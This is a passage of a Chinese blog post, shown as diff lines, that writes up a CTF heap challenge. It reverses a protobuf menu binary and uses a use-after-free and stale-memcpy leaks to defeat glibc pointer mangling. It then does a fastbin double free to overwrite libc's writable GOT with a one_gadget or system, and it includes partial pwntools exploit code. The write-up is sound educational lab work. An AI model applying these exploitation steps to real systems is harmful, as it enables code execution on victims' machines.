<span class="comment">/**&lt; int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line">    PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line">    PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line">    PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line">    PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure>
+<p>label类似于数据库的限制条件，允许为空，允许重复，必须填值这种。其实label也不太重要，我们逆向全写optional就行。</p>
+<p>在IDA中写好这几个localtype后，定位文件中的结构体并进行还原。可以知道heybro有5个字段，直接写好我们的proto文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax=&quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">message heybro&#123;</span><br><span class="line">    optional bytes whatcon = 1;</span><br><span class="line">    optional sint64 whattodo = 2;</span><br><span class="line">    optional sint64  whatidx = 3;</span><br><span class="line">    optional sint64 whatsize = 4;</span><br><span class="line">    optional uint32 whatsthis = 5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后<code>protoc --python_out=. proto_buf.proto</code>编译成python文件直接用。<br>以add为例，简单好用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> proto_buf_pb2.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,data</span>):</span><br><span class="line">    chunk = proto_buf_pb2.heybro()</span><br><span class="line">    chunk.whatcon = data</span><br><span class="line">    chunk.whattodo = <span class="number">1</span></span><br><span class="line">    chunk.whatidx = idx</span><br><span class="line">    chunk.whatsize = <span class="number">0</span></span><br><span class="line">    chunk.whatsthis = <span class="number">0</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;WANT?\n&quot;</span>,chunk.SerializeToString())</span><br></pre></td></tr></table></figure>
+<h1 id="程序控制流"><a href="#程序控制流" class="headerlink" title="程序控制流"></a>程序控制流</h1><p>分析出这几个字段之后，main函数里面调用的不知所云的函数就直接猜测是翻译字节流还原的了，下面参数混乱的菜单函数也不用管参数，对着选项结合heybro的字段名大概能猜出来：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">menu</span><span class="params">(__int64 a1, <span class="type">void</span> *whatcon, __int64 whattodo, __int64 whatidx, __int64 whatsize, <span class="type">int</span> whatsthis)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( whattodo )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0LL</span>:</span><br><span class="line">      nop();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">      add(whatidx, a1, whatcon);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">      delete(whatidx);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">      show(whatidx, whatsthis, whatsize, a1, (<span class="type">char</span> *)whatcon);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>菜单的功能也比较怪异。。</p>
+<h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p>malloc固定大小0x30的chunk，然后从buf memcpy0x30字节的内容到堆块中。堆指针维护在一个数组里，最大申请idx为8，但是大于8也允许操作，只是idx重置到8.<br>另外这意味着我们没有largebin的利用了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">add</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx, __int64 a2, <span class="type">const</span> <span class="type">void</span> *whatcon)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx_rel; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line">  idx_rel = idx;</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">8</span> )</span><br><span class="line">    idx_rel = <span class="number">8</span>;</span><br><span class="line">  chunks[idx_rel] = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)chunks[idx_rel], whatcon, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里有个漏洞点静态分析可能看不出，无论content传入什么长度的内容，它都会copy 0x30字节。这意味着我们如果输入很短的内容可能会把别的脏东西copy到我们的堆块上。事实证明确实是这样。</p>
+</blockquote>
+<h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><p>传入idx进行free，只允许我们释放10次，指针没置空有UAF。但是菜单没有edit功能所以只能用来泄露。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">delete</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)free_cnt &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No chance!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">8</span> || !chunks[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OOPS!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)chunks[idx]);</span><br><span class="line">  <span class="keyword">return</span> ++free_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>其实搞懂了之后回来看，只能说释放10次加0x40大小堆块已经有点暗示填满tcache+3次fastbin dup了</p>
+</blockquote>
+<h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p>这个函数是最抽象的，下面看看它干了什么</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show_edit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> whatidx, <span class="type">int</span> whatsthis, __int64 whatsize, __int64 a4, <span class="type">char</span> *whatcon)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> delim; <span class="comment">// [rsp+33h] [rbp-1Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *chunk_ptr; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> fake_ptr_on_stack[<span class="number">15</span>]; <span class="comment">// [rsp+41h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;fake_ptr_on_stack[<span class="number">7</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  idx = whatidx;</span><br><span class="line">  delim = whatsthis;</span><br><span class="line">  <span class="built_in">strcpy</span>(fake_ptr_on_stack, <span class="string">&quot;hahaha&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( whatidx &lt;= <span class="number">8</span> &amp;&amp; chunks[idx] )</span><br><span class="line">    chunk_ptr = (<span class="type">char</span> *)chunks[idx];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    chunk_ptr = fake_ptr_on_stack;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( whatsthis == <span class="number">0xFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    seccomp_load(seccomp_rules);</span><br><span class="line">    strtok(whatcon, &amp;delim);</span><br><span class="line">    chunk_ptr = strtok(<span class="number">0LL</span>, &amp;delim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( whatsize == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(buf, &amp;delim);</span><br><span class="line">    chunk_ptr = strtok(<span class="number">0LL</span>, &amp;delim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, chunk_ptr);</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( ++show_cnt == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    close(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)&amp;fake_ptr_on_stack[<span class="number">7</span>] - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>首先，只允许我们打印两次，到3就会关闭stdout和stderr就没法交互了</li>
+<li>正常泄露的话，它就会<code>printf(&quot;%s&quot;,chunk)</code></li>
+<li>如果whatsthis附加为0xff，这里就会装载沙箱然后调用strtok分割whatcon域，很莫名其妙的操作</li>
+<li>如果whatsize附加为0x30，这里也会调用strtok，只不过是分割buf（buf也很乱后面再提）</li>
+<li>输出完之后会free掉buf</li>
+</ul>
+<blockquote>
+<p>事实上到最后也没用到这上面的分支</p>
+</blockquote>
+<h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><p>函数都是死的，交给copilot。前面提到的这个沙箱ban了execve，允许了orw，mprotect，文件描述符复制还有一些别的乱七八糟的东西。其实不用管，只要whatsize不传0xFF它就不会装载。</p>
+<h2 id="堆块的操作？"><a href="#堆块的操作？" class="headerlink" title="堆块的操作？"></a>堆块的操作？</h2><p>首先，buf这个字段是乱用的。动调断在malloc可以发现，主函数的一个循环会默认有这么几个操作：</p>
+<ol>
+<li>malloc(0x48) 一轮循环开头固定</li>
+<li>malloc(len(content)+3)</li>
+<li>malloc(0x30) -&gt; 我们能读的</li>
+<li>malloc(0x200) 一轮循环结尾固定<br>更不要提各种的free。我们能控制的非常有限，但是0x40的fastbin和tcache都是纯净的可以供我们利用。</li>
+</ol>
+<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>思路参考自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14709%EF%BC%8C%E5%8F%A6%E5%A4%96%E7%9C%8B%E5%88%B0%E6%9C%89%E5%B8%88%E5%82%85[%E7%94%A8obstack%E6%89%93](https://rot-will.github.io/page/wp/2024ciscn%E5%88%9D%E8%B5%9Bwp-pwn/#ezbuf)%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91python%E7%BC%BA%E5%BA%93%E4%B9%9F%E6%B2%A1%E6%9C%89%E4%BB%8B%E7%BB%8D%E4%B9%9F%E7%9C%8B%E4%B8%8D%E6%87%82%E6%80%8E%E4%B9%88%E6%89%93%E7%9A%84%E5%B0%B1%E4%B8%8D%E6%8F%90%E4%BA%86">https://xz.aliyun.com/t/14709，另外看到有师傅[用obstack打](https://rot-will.github.io/page/wp/2024ciscn%E5%88%9D%E8%B5%9Bwp-pwn/#ezbuf)，但是我python缺库也没有介绍也看不懂怎么打的就不提了</a></p>
+<h2 id="泄露——tcache和fastbin指针加密"><a href="#泄露——tcache和fastbin指针加密" class="headerlink" title="泄露——tcache和fastbin指针加密"></a>泄露——tcache和fastbin指针加密</h2><p>我们只能泄露两个地址，必然是一个堆一个libc。堆可以通过tcache泄露，libc的泄露比较神奇，上面提到了memcpy可能存在的复制脏数据问题，这里其实<code>add(0,b&#39;a&#39;*8)</code>再读就能发现了，里面是一个main_arena的libc地址，具体的堆排布也没有细看，反正偏移肯定是固定的直接打出来就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment"># 0</span></span><br><span class="line">show(<span class="number">0</span>) <span class="comment"># 1次泄露libc</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21ace0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] libc_addr=<span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>在glibc 2.32之后，tcache和fastbin都对指针进行了加密，原理是原本的指针异或上堆当前页地址右移12位。因此泄露不能随便打，堆地址要泄露tcache头部的块来获得key，因为第一次链入的时候是异或全0的。</p>
+<p>这里结合动调来确认指针内容和堆排布。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i+<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment"># 1-6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 7/10</span></span><br><span class="line">    delete(<span class="number">6</span>-i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache 0x40: 0 1 2 3 4 5 6</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">heap = (u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span>)-<span class="number">0x4000</span><span class="comment"># 填满后走fastbin吧</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin dup"></a>fastbin dup</h2><p>填满tcache之后接下来我们还剩三次free，很难忍得住不用fastbin double free。简单好用任意地址写。</p>
+<blockquote>
+<p>没有edit溢出，chunk内容用memcpy实现大小锁死。也只能这样了。这里可能还有利用程序中其他malloc去布局的方法，但是有点太困难了。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup 任意地址写</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)<span class="comment"># 10/10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment"># tcache取回，让我们从fastbin分配chunk</span></span><br><span class="line"></span><br><span class="line">fastkey=(heap&gt;&gt;<span class="number">12</span>)+<span class="number">4</span> <span class="comment"># 泄露fastbin的POS key，这里是堆基址加上0x4000</span></span><br></pre></td></tr></table></figure>
+<h2 id="一次任意地址写任意值…结束了吗？"><a href="#一次任意地址写任意值…结束了吗？" class="headerlink" title="一次任意地址写任意值…结束了吗？"></a>一次任意地址写任意值…结束了吗？</h2><p>现在我们只要申请堆块就能任意地址写任意值了。高版本移除了hook函数，有一个任意地址写任意值来getshell，我自己是想到了house_of_banana.这个利用是程序用<code>exit()</code>退出的话，有一条<code>_dl_fini-&gt;_rtld_global-&gt;link_map.finiarray</code>的函数指针执行流，而函数指针是通过link_map中的l_loaded保存的程序基地址加偏移定位的。具体利用这里不展开，可以参考这两篇blog,后面也会单独写blog（或许）：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/345968.html">https://www.freebuf.com/articles/system/345968.html</a><br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31</a><br>这里我搞了半天发现就是打不通，fini_array里有一个指针是在base+0xbad8处，我在堆块上写好gadget后将l_loaded改成chunk-0xbad8打不通。有点卡住了，因为我们没法再泄露程序的基地址了。aslr会让堆的偏移不固定，我们只能保证heap内部的偏移而无法保证它和程序的偏移，利用链有点断了。</p>
+</blockquote>
+<p>这时候研究wp，发现他任意地址写了一个神秘地点，gdb打印显示是<code>*ABS*@got.plt</code>, 发给学长询问学长也不懂，但是提供了一个分析思路。在ida中分析libc查这个偏移发现是libc的got表，而且这段是可读写的？！原来是程序开了FULL RELRO但是libc只开了Partial RELRO。而程序中调用到的strlen还有strtok等函数在libc的got表里。我们写这个got为onegadget就能直接getshell了。</p>
+<blockquote>
+<p>所以为什么libc自己这个动态库还要got跳转。。。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:000000000021A000 ; ===========================================================================</span><br><span class="line">.got.plt:000000000021A000</span><br><span class="line">.got.plt:000000000021A000 ; Segment type: Pure data</span><br><span class="line">.got.plt:000000000021A000 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:000000000021A000 _got_plt        segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.got.plt:000000000021A000                 assume cs:_got_plt</span><br><span class="line">.got.plt:000000000021A000                 ;org 21A000h</span><br><span class="line">.got.plt:000000000021A000                 dq offset stru_219BC0</span><br><span class="line">.got.plt:000000000021A008 qword_21A008    dq 0                    ; DATA XREF: sub_28000↑r</span><br><span class="line">.got.plt:000000000021A010 qword_21A010    dq 0                    ; DATA XREF: sub_28000+6↑r</span><br><span class="line">.got.plt:000000000021A018 off_21A018      dq offset strnlen       ; DATA XREF: j_strnlen+4↑r</span><br><span class="line">.got.plt:000000000021A018                                         ; Indirect relocation</span><br><span class="line">.got.plt:000000000021A020 off_21A020      dq offset rawmemchr     ; DATA XREF: j_rawmemchr+4↑r</span><br><span class="line">.got.plt:000000000021A020                                         ; Indirect relocation</span><br><span class="line">.got.plt:000000000021A028 off_21A028      dq offset realloc       ; DATA XREF: _realloc+4↑r</span><br><span class="line">.got.plt:000000000021A030 off_21A030      dq offset strncasecmp   ; DATA XREF: j_strncasecmp+4↑r</span><br><span class="line">.got.plt:000000000021A030                                         ; Indirect relocation</span><br><span class="line">.got.plt:000000000021A038 off_21A038      dq offset _dl_exception_create</span><br><span class="line">.got.plt:000000000021A038                                         ; DATA XREF: __dl_exception_create+4↑r</span><br><span class="line">.got.plt:000000000021A040 off_21A040      dq offset mempcpy       ; DATA XREF: j_mempcpy+4↑r</span><br><span class="line">.got.plt:000000000021A040                                         ; Indirect relocation</span><br><span class="line">.got.plt:000000000021A048 off_21A048      dq offset wmemset       ; DATA XREF: j_wmemset+4↑r</span><br><span class="line">.got.plt:000000000021A048                                         ; Indirect relocation</span><br><span class="line">.got.plt:000000000021A050 off_21A050      dq offset calloc        ; DATA XREF: _calloc+4↑r</span><br><span class="line">.got.plt:000000000021A058 off_21A058      dq offset strspn        ; DATA XREF: j_strspn+4↑r</span><br><span class="line">.got.plt:000000000021A058                                         ; Indirect relocation</span><br><span class="line">[.......]</span><br></pre></td></tr></table></figure>
+
+<h2 id="onegadget"><a href="#onegadget" class="headerlink" title="onegadget..?"></a>onegadget..?</h2><p>虽然没有沙箱，但是execve的gadget全都打不通。再回去看wp，发现他使用的-l 1找到的<code>posix_spawn</code>的gadget。这玩意好像会新开线程，涉及子进程什么的可能gdb会有问题，所以之前用gdb一调就打不通不调就能打通。</p>
+<p>思路捋清了之后我自己又改了几个偏移和onegadget但是都打不通。。。只能说确实厉害。那篇将protobuf的blog下面是看了strtok内部的调用strspn然后改了got直接用system，最后传了whatsize&#x3D;0x30触发分支来getshell的。</p>
+<blockquote>
+<p>onegadget execve的估计这个题都够呛</p>
+</blockquote>
+<p>最后，搞了半天发现house_of_banana之所以不触发，是因为这个程序一是没有main函数return，而是用的退出都是<code>_exit()</code>而非<code>exit()</code>，这俩函数在程序里都叫exit但是通过偏移我去libc看了下源码，这个<code>_exit</code>只有短短几行，没有任何多余处理直接是陷入内核syscall来触发。而我们说的那些调用链,io什么乱七八糟的归根结底都是用户态glibc的机制。exit的内部最后也是调用的<code>_exit</code>。下次要小心了。。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题收获还是不少的：</p>
+<ul>
+<li>protobuf通讯get– √</li>
+<li><strong>全新的利用：检查libc的got保护，从libc层面劫持got表，可以借助本地同版本有符号的libc进行定位或者是在ida静态分析libc文件找偏移</strong>– √</li>
+<li>高版本glibc的tcache和fastbin指针加密与泄露–√</li>
+<li>house_of_banana思路（虽然没成功）–√</li>
+<li>_exit和exit的天壤之别 –√</li>
+</ul>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2024/09/03/GO-rust%E7%AD%89%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%9A%84%E9%80%86%E5%90%91/" title="GO,rust等其他语言的逆向">
+                    <div class="prevTitle">GO,rust等其他语言的逆向</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:zj_w1nd@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/ZjW1nd" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://steamcommunity.com/id/ZJwind/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span> readers</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Protobuf"><span class="toc-number">2.</span> <span class="toc-text">Protobuf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E6%8E%A7%E5%88%B6%E6%B5%81"><span class="toc-number">3.</span> <span class="toc-text">程序控制流</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#add"><span class="toc-number">3.1.</span> <span class="toc-text">add</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete"><span class="toc-number">3.2.</span> <span class="toc-text">delete</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show"><span class="toc-number">3.3.</span> <span class="toc-text">show</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1"><span class="toc-number">3.4.</span> <span class="toc-text">沙箱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 